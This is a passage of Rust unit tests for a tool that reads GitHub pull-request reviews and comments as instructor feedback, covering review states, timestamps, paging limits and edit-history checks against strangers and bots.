    }

    #[test]
    fn an_approval_is_feedback_only_with_inline_comments_a_dismissed_review_with_words_or_inline_comments_is_too()
     {
        // softfac also counts an approval with a body, so approving with "LGTM!" would send the
        // pull request back to draft and the issue back to building. This port does not.
        let inline = inline_node("nit", "src/a.rs", 3, "rawphp");
        let got = read_feedback(&feedback_reply(
            &[
                review_node(
                    11,
                    "APPROVED",
                    "",
                    Some("2026-10-04T11:00:00Z"),
                    "rawphp",
                    &[],
                ),
                review_node(
                    12,
                    "DISMISSED",
                    "  \n",
                    Some("2026-10-04T11:01:00Z"),
                    "rawphp",
                    &[],
                ),
                review_node(
                    13,
                    "APPROVED",
                    "LGTM!",
                    Some("2026-10-04T11:02:00Z"),
                    "rawphp",
                    &[],
                ),
                review_node(
                    14,
                    "APPROVED",
                    "",
                    Some("2026-10-04T11:03:00Z"),
                    "rawphp",
                    std::slice::from_ref(&inline),
                ),
                review_node(
                    15,
                    "DISMISSED",
                    "stale",
                    Some("2026-10-04T11:04:00Z"),
                    "rawphp",
                    &[],
                ),
                review_node(
                    16,
                    "APPROVED",
                    "one more nit",
                    Some("2026-10-04T11:05:00Z"),
                    "rawphp",
                    std::slice::from_ref(&inline),
                ),
            ],
            &[],
        ));
        assert_eq!(
            feedback_ids(&got),
            vec!["review:14", "review:15", "review:16"]
        );
    }

    #[test]
    fn a_dismissed_review_with_a_blank_body_is_feedback_for_its_inline_comments() {
        let got = read_feedback(&feedback_reply(
            &[review_node(
                12,
                "DISMISSED",
                "  \n",
                Some("2026-10-04T11:01:00Z"),
                "rawphp",
                &[inline_node("nit", "src/a.rs", 3, "rawphp")],
            )],
            &[],
        ));
        assert_eq!(feedback_ids(&got), vec!["review:12"]);
    }

    #[test]
    fn a_comment_and_a_commented_review_that_only_say_lgtm_are_still_feedback() {
        // The factory's login opens the pull requests, so an instructor acting as it can only
        // comment: only an approval's body is left unread.
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                "looks good",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &[],
            )],
            &[pr_comment_node(
                21,
                "LGTM, merging after the release",
                "2026-10-04T11:01:00Z",
                "rawphp",
            )],
        ));
        assert_eq!(feedback_ids(&got), vec!["review:11", "pr-comment:21"]);
    }

    #[test]
    fn a_review_that_is_still_pending_or_has_no_submission_time_is_not_feedback() {
        let got = read_feedback(&feedback_reply(
            &[
                review_node(
                    11,
                    "PENDING",
                    "draft",
                    Some("2026-10-04T11:00:00Z"),
                    "rawphp",
                    &[],
                ),
                review_node(12, "COMMENTED", "x", None, "rawphp", &[]),
            ],
            &[],
        ));
        assert_eq!(got, vec![]);
    }

    #[test]
    fn a_review_with_more_inline_comments_than_were_read_says_how_many_are_missing() {
        let shown: Vec<Value> = (0..100)
            .map(|i| inline_node(&format!("note {i}"), "src/a.rs", 7, "rawphp"))
            .collect();
        let with_total = |mut review: Value, total: u64| {
            review["comments"]["totalCount"] = json!(total);
            review
        };
        let many = read_feedback(&feedback_reply(
            &[with_total(
                review_node(
                    11,
                    "COMMENTED",
                    "many",
                    Some("2026-10-04T11:00:00Z"),
                    "rawphp",
                    &shown,
                ),
                150,
            )],
            &[],
        ));
        assert_eq!(many[0].inline.len(), 100);
        assert_eq!(many[0].inline_unread, 50);
        // Read whole, or a count that is no larger than what came: nothing is missing.
        let whole = read_feedback(&feedback_reply(
            &[with_total(
                review_node(
                    12,
                    "COMMENTED",
                    "few",
                    Some("2026-10-04T11:00:00Z"),
                    "rawphp",
                    &[inline_node("a", "src/a.rs", 1, "rawphp")],
                ),
                1,
            )],
            &[],
        ));
        assert_eq!(whole[0].inline_unread, 0);
    }

    #[test]
    fn only_inline_comments_by_instructors_without_the_marker_are_kept_and_the_line_falls_back() {
        let inline = [
            inline_node("keep", "src/a.rs", 7, "rawphp"),
            inline_node("stranger", "src/b.rs", 8, "stranger"),
            inline_node("mine <!-- softfac -->", "src/c.rs", 9, "rawphp"),
            inline_node_at("outdated", "src/d.rs", None, "rawphp", Some(4)),
            inline_node_at("nowhere", "src/e.rs", None, "rawphp", None),
        ];
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                "",
                Some("2026-10-04T11:00:00Z"),
                "rawphp",
                &inline,
            )],
            &[],
        ));
        let kept: Vec<(&str, Option<u64>, &str)> = got[0]
            .inline
            .iter()
            .map(|c| (c.path.as_str(), c.line, c.body.as_str()))
            .collect();
        assert_eq!(
            kept,
            vec![
                ("src/a.rs", Some(7), "keep"),
                ("src/d.rs", Some(4), "outdated"),
                ("src/e.rs", None, "nowhere"),
            ]
        );
    }

    #[test]
    fn only_what_was_written_after_since_is_feedback_the_same_second_is_not_after() {
        let got = read_feedback(&feedback_reply(
            &[review_node(
                11,
                "COMMENTED",
                "old",
                Some("2026-10-04T10:29:59Z"),
                "rawphp",
                &[],
            )],
            &[
                pr_comment_node(21, "same second", FB_SINCE, "rawphp"),
                pr_comment_node(22, "new", "2026-10-04T10:30:01Z", "rawphp"),
            ],
        ));
        assert_eq!(feedback_ids(&got), vec!["pr-comment:22"]);
    }

    #[test]
    fn a_pull_request_that_is_gone_has_no_feedback() {
        assert_eq!(read_feedback(GONE), vec![]);
    }

    #[test]
    fn a_since_that_is_not_githubs_form_is_refused_before_gh_runs() {
        for since in [
            "",
            "2026-10-04",
            "2026-10-04 10:30:00",
            "2026-10-04T10:30:00.5Z",
        ] {
            let fake = FakeTracker::new();
            let error = error_with(&fake, since, since);
            assert!(is_parse(&error), "{since:?}");
            assert!(fake.calls().is_empty(), "{since:?}");
        }
    }

    #[test]
    fn a_floor_that_is_not_githubs_form_is_refused_before_gh_runs() {
        for floor in ["", "2026-10-04", "2026-10-04T10:30:00.5Z"] {
            let fake = FakeTracker::new();
            let error = error_with(&fake, FB_SINCE, floor);
            assert!(is_parse(&error), "{floor:?}");
            assert!(fake.calls().is_empty(), "{floor:?}");
        }
    }

    #[test]
    fn feedback_with_a_time_or_id_it_cannot_read_is_an_error_and_not_a_guess() {
        let mut no_id = pr_comment_node(21, "hi", "2026-10-04T11:00:00Z", "rawphp");
        no_id["fullDatabaseId"] = Value::Null;
        let bad_time = pr_comment_node(21, "hi", "yesterday", "rawphp");
        let not_a_number = pr_comment_node("abc", "hi", "2026-10-04T11:00:00Z", "rawphp");
        for comment in [no_id, bad_time, not_a_number] {
            let fake = FakeTracker::answering([Answer::ok(feedback_reply(
                &[],
                std::slice::from_ref(&comment),
            ))]);
            assert!(is_parse(&feedback_error(&fake)), "{comment}");
        }
        let mut no_review_id = review_node(
            11,
            "COMMENTED",
            "x",
            Some("2026-10-04T11:00:00Z"),
            "rawphp",
            &[],
        );
        no_review_id["fullDatabaseId"] = Value::Null;
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(&[no_review_id], &[]))]);
        assert!(is_parse(&feedback_error(&fake)));
        for garbage in ["", "no", "{}"] {
            let fake = FakeTracker::answering([Answer::ok(garbage)]);
            assert!(is_parse(&feedback_error(&fake)), "{garbage}");
        }
    }

    /// 50 reviews by a stranger at 11:00 to 11:49 on the day of `FB_SINCE`; the first at 09:00
    /// with `older_first`.
    fn fifty_reviews(older_first: bool) -> Vec<Value> {
        (0..50)
            .map(|i| {
                let at = if older_first && i == 0 {
                    "2026-10-04T09:00:00Z".to_string()
                } else {
                    format!("2026-10-04T11:{}:00Z", pad(i))
                };
                review_node(100 + i, "COMMENTED", "noise", Some(&at), "stranger", &[])
            })
            .collect()
    }

    fn oldest_is_instructors(id: u64, body: &str, at: &str) -> Value {
        review_node(id, "CHANGES_REQUESTED", body, Some(at), "rawphp", &[])
    }

    #[test]
    fn the_oldest_of_the_fifty_reviews_the_query_reads_is_still_read() {
        // GitHub lists the newest 50 oldest first: the instructor's review is the first of a
        // full page. With no `totalCount` saying more exist, nothing pages back.
        let mut reviews = vec![oldest_is_instructors(
            11,
            "the oldest",
            "2026-10-04T11:00:00Z",
        )];
        reviews.extend(fifty_reviews(false).into_iter().skip(1));
        assert_eq!(reviews.len(), 50);
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(&reviews, &[]))]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["review:11"]);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn a_full_page_of_new_reviews_with_more_behind_it_is_paged_back_to_read_the_51st() {
        let older = oldest_is_instructors(11, "the 51st", "2026-10-04T10:45:00Z");
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 51, "c1")),
            Answer::ok(reviews_page(&[older], 51, "c0")),
        ]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["review:11"]);
        assert_eq!(
            fake.calls(),
            vec![feedback_call(PR_FEEDBACK_QUERY, &[]), before_call("c1")]
        );
    }

    #[test]
    fn a_pending_oldest_review_does_not_stop_the_paging() {
        let mut pending = fifty_reviews(false);
        pending[0]["submittedAt"] = Value::Null;
        let older = oldest_is_instructors(11, "the 51st", "2026-10-04T10:45:00Z");
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&pending, &[], 51, "c1")),
            Answer::ok(reviews_page(&[older], 51, "c0")),
        ]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["review:11"]);
        assert_eq!(
            fake.calls(),
            vec![feedback_call(PR_FEEDBACK_QUERY, &[]), before_call("c1")]
        );
    }

    #[test]
    fn an_unreadable_time_on_the_oldest_review_is_an_error_and_pages_no_further() {
        let mut garbled = fifty_reviews(false);
        garbled[0]["submittedAt"] = json!("yesterday");
        let fake = FakeTracker::answering([Answer::ok(paged_reply(&garbled, &[], 51, "c1"))]);
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn paging_back_stops_at_a_review_at_or_before_the_starting_point() {
        let page = [
            review_node(
                10,
                "COMMENTED",
                "old",
                Some("2026-10-04T10:30:00Z"),
                "rawphp",
                &[],
            ),
            oldest_is_instructors(11, "new", "2026-10-04T10:45:00Z"),
        ];
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 200, "c1")),
            Answer::ok(reviews_page(&page, 200, "c0")),
        ]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["review:11"]);
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn paging_back_goes_on_while_the_oldest_review_read_is_still_new() {
        let page_of_new = |base: u64| -> Vec<Value> {
            (0..2)
                .map(|i| {
                    review_node(
                        base + i,
                        "COMMENTED",
                        "noise",
                        Some("2026-10-04T10:40:00Z"),
                        "stranger",
                        &[],
                    )
                })
                .collect()
        };
        let oldest = review_node(
            1,
            "COMMENTED",
            "old",
            Some("2026-10-04T09:00:00Z"),
            "stranger",
            &[],
        );
        let mut last = vec![oldest];
        last.extend(page_of_new(70));
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 54, "c1")),
            Answer::ok(reviews_page(&page_of_new(60), 54, "c0")),
            Answer::ok(reviews_page(&last, 54, "cx")),
        ]);
        read(&fake);
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                before_call("c1"),
                before_call("c0")
            ]
        );
    }

    #[test]
    fn a_failed_call_for_the_earlier_reviews_is_an_error_and_is_not_retried() {
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 51, "c1")),
            Answer::fail(1, "boom"),
        ]);
        let error = feedback_error(&fake);
        assert_eq!(
            error,
            TrackerError::Other {
                kind: OtherKind::Failed,
                message: format!(
                    "`{}` exited with status 1: boom",
                    command_text(&before_call("c1"))
                )
            }
        );
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn reviews_from_every_page_come_back_oldest_first() {
        let newer = review_node(
            30,
            "COMMENTED",
            "newer",
            Some("2026-10-04T11:20:00Z"),
            "rawphp",
            &[],
        );
        let older_page = [
            review_node(
                10,
                "COMMENTED",
                "old",
                Some("2026-10-04T10:30:00Z"),
                "rawphp",
                &[],
            ),
            review_node(
                20,
                "COMMENTED",
                "older",
                Some("2026-10-04T10:45:00Z"),
                "rawphp",
                &[],
            ),
        ];
        let mut first = vec![newer];
        first.extend(fifty_reviews(false));
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&first, &[], 100, "c1")),
            Answer::ok(reviews_page(&older_page, 100, "c0")),
        ]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["review:20", "review:30"]);
        assert_eq!(fake.calls().len(), 2);
    }

    /// Replies to the feedback query and to `pages - 1` paging calls, every page one new review
    /// by a stranger and a total no number of pages reaches, each with a cursor of its own. With
    /// `old_last` the last page is at or before the starting point.
    fn endless_reviews(pages: usize, old_last: bool) -> Vec<Answer> {
        let mut answers = vec![Answer::ok(paged_reply(
            &fifty_reviews(false),
            &[],
            1_000_000,
            "c1",
        ))];
        for i in 1..pages {
            let at = if old_last && i == pages - 1 {
                "2026-10-04T09:00:00Z"
            } else {
                "2026-10-04T10:40:00Z"
            };
            let review = review_node(1000 + i, "COMMENTED", "noise", Some(at), "stranger", &[]);
            answers.push(Answer::ok(reviews_page(
                &[review],
                1_000_000,
                &format!("c{}", i + 1),
            )));
        }
        answers
    }

    #[test]
    fn a_page_with_the_cursor_that_was_just_sent_is_an_error_after_two_calls() {
        let page = review_node(
            11,
            "COMMENTED",
            "noise",
            Some("2026-10-04T10:40:00Z"),
            "stranger",
            &[],
        );
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 1000, "c1")),
            Answer::ok(reviews_page(std::slice::from_ref(&page), 1000, "c1")),
            Answer::ok(reviews_page(std::slice::from_ref(&page), 1000, "c1")),
        ]);
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn paging_back_that_would_read_past_the_page_limit_is_an_error_after_the_limit() {
        let fake = FakeTracker::answering(endless_reviews(REVIEW_PAGE_LIMIT + 5, false));
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), REVIEW_PAGE_LIMIT);
    }

    #[test]
    fn paging_back_that_reaches_an_old_review_on_the_last_page_allowed_is_not_an_error() {
        let fake = FakeTracker::answering(endless_reviews(REVIEW_PAGE_LIMIT, true));
        read(&fake);
        assert_eq!(fake.calls().len(), REVIEW_PAGE_LIMIT);
    }

    #[test]
    fn a_total_equal_to_the_reviews_read_does_not_page_back() {
        let fake = FakeTracker::answering([Answer::ok(paged_reply(
            &fifty_reviews(false),
            &[],
            50,
            "c1",
        ))]);
        read(&fake);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn an_instructor_comment_pushed_out_of_the_newest_hundred_is_read_from_the_page_before() {
        let instructors = pr_comment_node(21, "please fix", "2026-10-04T10:31:00Z", "rawphp");
        let fake = FakeTracker::answering([
            Answer::ok(comments_paged_reply(
                &hundred_new_comments(),
                101,
                Some("k1"),
            )),
            Answer::ok(comments_page(&[instructors], 101, "k0")),
        ]);
        assert_eq!(feedback_ids(&read(&fake)), vec!["pr-comment:21"]);
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                comments_before_call("k1")
            ]
        );
    }

    #[test]
    fn conversation_comments_page_back_only_while_the_oldest_read_is_after_the_floor() {
        let mut at_floor = hundred_new_comments();
        at_floor[0]["createdAt"] = json!(FB_SINCE);
        for reply in [
            comments_paged_reply(&at_floor, 500, Some("k1")),
            comments_paged_reply(&hundred_new_comments(), 100, Some("k1")),
        ] {
            let fake = FakeTracker::answering([Answer::ok(reply)]);
            read(&fake);
            assert_eq!(fake.calls().len(), 1);
        }
        // Past `since` but not yet at the floor, so the page before is read too.
        let older = pr_comment_node(21, "between", "2026-10-04T10:40:00Z", "rawphp");
        let fake = FakeTracker::answering([
            Answer::ok(comments_paged_reply(
                &hundred_new_comments(),
                101,
                Some("k1"),
            )),
            Answer::ok(comments_page(&[older], 101, "k0")),
        ]);
        let got = read_with(&fake, FB_SINCE, "2026-10-04T10:50:00Z");
        assert_eq!(feedback_ids(&got), vec!["pr-comment:21"]);
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn an_empty_page_before_the_cursor_ends_the_conversation_comments() {
        let fake = FakeTracker::answering([
            Answer::ok(comments_paged_reply(
                &hundred_new_comments(),
                150,
                Some("k1"),
            )),
            Answer::ok(comments_page(&[], 150, "k0")),
        ]);
        assert_eq!(read(&fake), vec![]);
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn conversation_comments_short_of_the_floor_with_no_way_back_are_an_error() {
        let noise = [pr_comment_node(
            7,
            "noise",
            "2026-10-04T10:40:00Z",
            "stranger",
        )];
        // No cursor for the page before.
        let fake = FakeTracker::answering([Answer::ok(comments_paged_reply(
            &hundred_new_comments(),
            101,
            None,
        ))]);
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), 1);
        // The cursor that was just sent, again.
        let fake = FakeTracker::answering([
            Answer::ok(comments_paged_reply(
                &hundred_new_comments(),
                1000,
                Some("k1"),
            )),
            Answer::ok(comments_page(&noise, 1000, "k1")),
        ]);
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), 2);
        // The pull request gone between pages.
        let fake = FakeTracker::answering([
            Answer::ok(comments_paged_reply(
                &hundred_new_comments(),
                1000,
                Some("k1"),
            )),
            Answer::ok(GONE),
        ]);
        assert!(is_parse(&feedback_error(&fake)));
        // More pages than the limit.
        let mut answers = vec![Answer::ok(comments_paged_reply(
            &hundred_new_comments(),
            1_000_000,
            Some("k1"),
        ))];
        for i in 1..COMMENT_PAGE_LIMIT + 5 {
            answers.push(Answer::ok(comments_page(
                &noise,
                1_000_000,
                &format!("k{}", i + 1),
            )));
        }
        let fake = FakeTracker::answering(answers);
        assert!(is_parse(&feedback_error(&fake)));
        assert_eq!(fake.calls().len(), COMMENT_PAGE_LIMIT);
    }

    #[test]
    fn the_page_limit_is_twenty_pages_of_a_hundred_conversation_comments() {
        assert_eq!(COMMENT_PAGE_LIMIT, 20);
        assert!(COMMENTS_BEFORE_QUERY.contains("comments(last: 100, before: $before)"));
    }

    #[test]
    fn a_full_page_whose_oldest_review_is_at_or_before_the_starting_point_does_not_page_back() {
        let fake =
            FakeTracker::answering([Answer::ok(paged_reply(&fifty_reviews(true), &[], 51, "c1"))]);
        read(&fake);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn paging_back_stops_at_the_floor_and_still_judges_what_is_after_since() {
        let older =
            oldest_is_instructors(11, "after since, before the floor", "2026-10-04T10:45:00Z");
        let fake = FakeTracker::answering([
            Answer::ok(paged_reply(&fifty_reviews(false), &[], 1000, "c1")),
            Answer::ok(reviews_page(&[older], 1000, "c0")),
        ]);
        let got = read_with(&fake, FB_SINCE, "2026-10-04T10:50:00Z");
        assert_eq!(feedback_ids(&got), vec!["review:11"]);
        assert_eq!(
            fake.calls(),
            vec![feedback_call(PR_FEEDBACK_QUERY, &[]), before_call("c1")]
        );
    }

    #[test]
    fn a_full_page_whose_oldest_review_is_at_the_floor_does_not_page_back_and_is_judged() {
        let page = [
            oldest_is_instructors(11, "at the floor", "2026-10-04T11:00:00Z"),
            review_node(
                12,
                "COMMENTED",
                "noise",
                Some("2026-10-04T11:05:00Z"),
                "stranger",
                &[],
            ),
        ];
        let fake = FakeTracker::answering([Answer::ok(paged_reply(&page, &[], 1000, "c1"))]);
        let got = read_with(&fake, FB_SINCE, "2026-10-04T11:00:00Z");
        assert_eq!(feedback_ids(&got), vec!["review:11"]);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn paging_back_ends_on_an_empty_page_and_fails_on_a_gone_pull_request_or_a_missing_cursor() {
        let first = paged_reply(&fifty_reviews(false), &[], 99, "c1");
        // GitHub answers `before:` the oldest cursor with an empty page: the start was reached.
        let empty = FakeTracker::answering([
            Answer::ok(first.as_str()),
            Answer::ok(reviews_page(&[], 99, "c0")),
        ]);
        read(&empty);
        assert_eq!(empty.calls().len(), 2);

        let gone = FakeTracker::answering([Answer::ok(first.as_str()), Answer::ok(GONE)]);
        assert!(is_parse(&feedback_error(&gone)));
        assert_eq!(gone.calls().len(), 2);

        let no_cursor = FakeTracker::answering([Answer::ok(
            json!({"data": {"repository": {"pullRequest": {
                "reviews": {"totalCount": 99, "nodes": fifty_reviews(false)},
                "comments": {"nodes": []},
            }}}})
            .to_string(),
        )]);
        assert!(is_parse(&feedback_error(&no_cursor)));
        assert_eq!(no_cursor.calls().len(), 1);
    }

    const EDITED_AT: &str = "2026-10-04T11:05:00Z";

    fn edit_history(total: u64, shown: &[(&str, &str)]) -> Value {
        json!({
            "totalCount": total,
            "nodes": shown
                .iter()
                .map(|(edited_at, who)| json!({"editedAt": edited_at, "editor": person(who)}))
                .collect::<Vec<_>>(),
        })
    }

    const BY_INSTRUCTOR_ONLY: [(&str, &str); 2] =
        [(EDITED_AT, "rawphp"), ("2026-10-04T11:00:00Z", "rawphp")];
    const STRANGER_THEN_INSTRUCTOR: [(&str, &str); 3] = [
        (EDITED_AT, "rawphp"),
        ("2026-10-04T11:03:00Z", "stranger"),
        ("2026-10-04T11:00:00Z", "rawphp"),
    ];
    const BY_STRANGER: [(&str, &str); 2] =
        [(EDITED_AT, "stranger"), ("2026-10-04T11:00:00Z", "rawphp")];

    /// A conversation comment by `rawphp`, last edited at 11:05 by `last_editor`, with `history`
    /// as its edits.
    fn edited_pr_comment(id: u64, last_editor: &str, history: Value) -> Value {
        let mut comment = pr_comment_node(id, "text", "2026-10-04T11:00:00Z", "rawphp");
        comment["lastEditedAt"] = json!(EDITED_AT);
        comment["editor"] = person(last_editor);
        comment["userContentEdits"] = history;
        comment
    }

    /// A review by `rawphp`, last edited at 11:05 by `last_editor`, with `history` as its edits.
    fn edited_review(id: u64, last_editor: &str, history: Value) -> Value {
        let mut review = review_node(
            id,
            "COMMENTED",
            "text",
            Some("2026-10-04T11:00:00Z"),
            "rawphp",
            &[],
        );
        review["lastEditedAt"] = json!(EDITED_AT);
        review["editor"] = person(last_editor);
        review["userContentEdits"] = history;
        review
    }

    /// An inline comment by `rawphp` with node id `id`, edited at 11:05. Its history is read on
    /// its own.
    fn edited_inline(body: &str, id: Option<&str>) -> Value {
        let mut node = json!({
            "body": body,
            "path": "src/a.rs",
            "line": 7,
            "originalLine": 7,
            "author": person("rawphp"),
            "lastEditedAt": EDITED_AT,
        });
        if let Some(id) = id {
            node["id"] = json!(id);
        }
        node
    }

    /// One node of GitHub's answer to the edit-history query.
    fn edit_node(id: &str, last_editor: &str, history: Value) -> Value {
        json!({
            "id": id,
            "lastEditedAt": EDITED_AT,
            "editor": person(last_editor),
            "userContentEdits": history,
        })
    }

    fn edit_nodes_reply(nodes: &[Value]) -> String {
        json!({"data": {"nodes": nodes}}).to_string()
    }

    fn review_with(at: &str, inline: &[Value]) -> Value {
        review_node(
            11,
            "CHANGES_REQUESTED",
            "please fix",
            Some(at),
            "rawphp",
            inline,
        )
    }

    #[test]
    fn an_item_edited_by_someone_who_is_not_an_instructor_is_not_feedback() {
        let by_stranger = edited_pr_comment(21, "stranger", edit_history(2, &BY_STRANGER));
        let by_instructor = edited_pr_comment(22, "rawphp", edit_history(2, &BY_INSTRUCTOR_ONLY));
        let mut by_nobody = pr_comment_node(23, "changed", "2026-10-04T11:02:00Z", "rawphp");
        by_nobody["lastEditedAt"] = json!(EDITED_AT);
        by_nobody["editor"] = Value::Null;
        by_nobody["userContentEdits"] = json!({"totalCount": 1, "nodes": []});
        let mut by_bot = edited_review(11, "rawphp", edit_history(2, &BY_INSTRUCTOR_ONLY));
        by_bot["editor"] = json!({"__typename": "Bot", "login": "rawphp"});
        let got = read_feedback(&feedback_reply(
            &[by_bot],
            &[by_stranger, by_instructor, by_nobody],
        ));
        assert_eq!(feedback_ids(&got), vec!["pr-comment:22"]);
    }

    #[test]
    fn a_strangers_edit_followed_by_an_instructors_touch_up_is_not_feedback() {
        let history = edit_history(3, &STRANGER_THEN_INSTRUCTOR);
        let got = read_feedback(&feedback_reply(
            &[edited_review(11, "rawphp", history.clone())],
            &[edited_pr_comment(21, "rawphp", history)],
        ));
        assert_eq!(got, vec![]);
    }

    #[test]
    fn an_item_whose_edits_were_all_an_instructors_is_feedback() {
        let history = edit_history(2, &BY_INSTRUCTOR_ONLY);
        let got = read_feedback(&feedback_reply(
            &[edited_review(11, "rawphp", history.clone())],
            &[edited_pr_comment(21, "rawphp", history)],
        ));
        assert_eq!(feedback_ids(&got), vec!["review:11", "pr-comment:21"]);
    }

    #[test]
    fn an_edit_history_that_is_cut_off_or_lacks_the_latest_edit_is_not_feedback() {
        // Three edits, two shown: an older one may be a stranger's.
        let cut_off = edit_history(3, &BY_INSTRUCTOR_ONLY);
        // Edited, and no history at all.
        let mut missing = edited_pr_comment(22, "rawphp", edit_history(2, &BY_INSTRUCTOR_ONLY));
        missing.as_object_mut().unwrap().remove("userContentEdits");
        // The newest entry is not the latest edit.
        let stale = edit_history(1, &[("2026-10-04T11:00:00Z", "rawphp")]);
        let got = read_feedback(&feedback_reply(
            &[edited_review(11, "rawphp", cut_off.clone())],
            &[
                edited_pr_comment(21, "rawphp", cut_off),
                missing,
                edited_pr_comment(23, "rawphp", stale),
            ],
        ));
        assert_eq!(got, vec![]);
    }

    #[test]
    fn an_inline_comment_edited_by_a_stranger_is_dropped_and_the_rest_of_the_review_stays() {
        let inline = [
            inline_node("untouched", "src/a.rs", 7, "rawphp"),
            edited_inline("by stranger", Some("C1")),
            edited_inline("stranger then touch-up", Some("C2")),
            edited_inline("own touch-up", Some("C3")),
        ];
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(
                &[review_with("2026-10-04T11:00:00Z", &inline)],
                &[],
            )),
            Answer::ok(edit_nodes_reply(&[
                edit_node("C1", "stranger", edit_history(2, &BY_STRANGER)),
                edit_node("C2", "rawphp", edit_history(3, &STRANGER_THEN_INSTRUCTOR)),
                edit_node("C3", "rawphp", edit_history(2, &BY_INSTRUCTOR_ONLY)),
            ])),
        ]);
        let got = read(&fake);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].body, "please fix");
        let bodies: Vec<&str> = got[0].inline.iter().map(|c| c.body.as_str()).collect();
        assert_eq!(bodies, vec!["untouched", "own touch-up"]);
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                editor_call(&ids(&["C1", "C2", "C3"]))
            ]
        );
    }

    #[test]
    fn an_unedited_inline_comment_costs_no_second_call() {
        let inline = [inline_node("plain", "src/a.rs", 7, "rawphp")];
        let fake = FakeTracker::answering([Answer::ok(feedback_reply(
            &[review_with("2026-10-04T11:00:00Z", &inline)],
            &[],
        ))]);
        let got = read(&fake);
        assert_eq!(got[0].inline.len(), 1);
        assert_eq!(fake.calls().len(), 1);
    }

    #[test]
    fn an_edited_inline_comment_whose_whole_history_is_an_instructors_is_kept() {
        let inline = [edited_inline("touched up", Some("PRRC_abc"))];
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(
                &[review_with("2026-10-04T11:00:00Z", &inline)],
                &[],
            )),
            Answer::ok(edit_nodes_reply(&[edit_node(
                "PRRC_abc",
                "rawphp",
                edit_history(2, &BY_INSTRUCTOR_ONLY),
            )])),
        ]);
        let got = read(&fake);
        assert_eq!(got[0].inline[0].body, "touched up");
        assert_eq!(
            fake.calls(),
            vec![
                feedback_call(PR_FEEDBACK_QUERY, &[]),
                editor_call(&ids(&["PRRC_abc"]))
            ]
        );
    }

    /// Reads one review whose one inline comment `PRRC_abc` was edited, with this answer to the
    /// history query.
    fn inline_kept_given(answer: &str) -> Vec<String> {
        let inline = [edited_inline("touched up", Some("PRRC_abc"))];
        let fake = FakeTracker::answering([
            Answer::ok(feedback_reply(
                &[review_with("2026-10-04T11:00:00Z", &inline)],
                &[],
            )),
            Answer::ok(answer),
        ]);
        let got = read(&fake);
        assert_eq!(got.len(), 1, "the review stays");
        got[0].inline.iter().map(|c| c.body.clone()).collect()
    }

    #[test]
    fn an_edited_inline_comment_with_a_cut_off_history_is_dropped_and_the_review_stays() {
        let answer = edit_nodes_reply(&[edit_node(
            "PRRC_abc",
            "rawphp",
            edit_history(3, &BY_INSTRUCTOR_ONLY),
        )]);
        assert_eq!(inline_kept_given(&answer), Vec::<String>::new());
    }

    #[test]
    fn an_edited_inline_comment_with_a_full_page_of_edits_is_dropped_and_the_review_stays() {
        // A hundred entries, all the instructor's, and the total says no more: a full page may
        // still hide older ones.
        let shown: Vec<(&str, &str)> = (0..100).map(|_| (EDITED_AT, "rawphp")).collect();
        let answer =
            edit_nodes_reply(&[edit_node("PRRC_abc", "rawphp", edit_history(100, &shown))]);
        assert_eq!(inline_kept_given(&answer), Vec::<String>::new());
    }

    #[test]
    fn an_edited_inline_comment_touched_by_a_bot_with_an_instructors_login_is_dropped() {
        let bot = json!({"__typename": "Bot", "login": "rawphp"});
        let rawphp = person("rawphp");
        let history = |first: &Value, second: &Value| {
            json!({
                "totalCount": 2,
                "nodes": [
                    {"editedAt": EDITED_AT, "editor": first},
                    {"editedAt": "2026-10-04T11:00:00Z", "editor": second},
                ],
            })
        };
        let last_editor_is_a_bot = json!({
            "id": "PRRC_abc",
            "lastEditedAt": EDITED_AT,
            "editor": bot,
            "userContentEdits": history(&bot, &rawphp),
        });
        assert_eq!(
            inline_kept_given(&edit_nodes_reply(&[last_editor_is_a_bot])),
            Vec::<String>::new()
        );
        // The bot is one of the earlier edits.
        let bot_in_the_history = json!({
            "id": "PRRC_abc",
            "lastEditedAt": EDITED_AT,
            "editor": rawphp,
            "userContentEdits": history(&rawphp, &bot),
        });
        assert_eq!(
            inline_kept_given(&edit_nodes_reply(&[bot_in_the_history])),
